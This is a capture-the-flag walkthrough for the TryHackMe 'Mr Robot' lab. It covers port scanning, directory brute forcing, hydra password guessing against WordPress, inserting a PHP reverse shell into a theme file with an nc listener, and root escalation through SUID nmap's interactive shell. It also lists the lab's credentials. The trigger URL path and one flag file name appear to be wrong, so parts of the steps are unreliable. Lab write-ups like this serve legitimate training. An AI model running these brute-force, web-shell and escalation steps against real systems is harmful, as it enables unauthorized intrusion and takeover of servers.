# Mr Robot CTF Writeup (TryHackMe)

High-level flow: `nmap` > `gobuster` > `hydra` > WordPress reverse shell > privilege escalation.

## Step 1: Port scan
```bash
nmap -sC -sV <TARGET_IP>
```

## Step 2: Content discovery
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Step 3: Robots.txt hint
Check `robots.txt`. It reveals:
- `key-1-of-3.txt` (first flag)
- `fsocity.dic` (wordlist for username/password brute force)

## Step 4: Brute-force WordPress
Run `hydra` to find a valid username, then brute-force the password for that user.

Credentials found:
- Username: `Elliot`
- Password: `ER28-0652`

## Step 5: Get a shell via WordPress theme editor
In the WordPress admin panel, edit `archive.php` for the `twentyfifteen` theme and insert the Pentestmonkey PHP reverse shell. Update your IP/port and start a listener:

```bash
nc -lvnp <PORT>
```

Trigger the shell by browsing:

```
http://<TARGET_IP>/wp-themes/twentyfifteen/archive.php
```

## Step 6: User escalation (robot)
Upgrade the shell and check for local privilege escalation paths. The `robot` user's password hash is MD5; crack it and switch users:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
su robot
cat /home/robot/ckey-2-of-3.txt
```

## Step 7: Root escalation
Find SUID binaries and use the `nmap` interactive mode to spawn a shell:

```bash
find / -perm -4000 2>/dev/null
nmap --interactive
!sh
```

Then grab the final flag:

```bash
cd /root
cat key-3-of-3.txt
```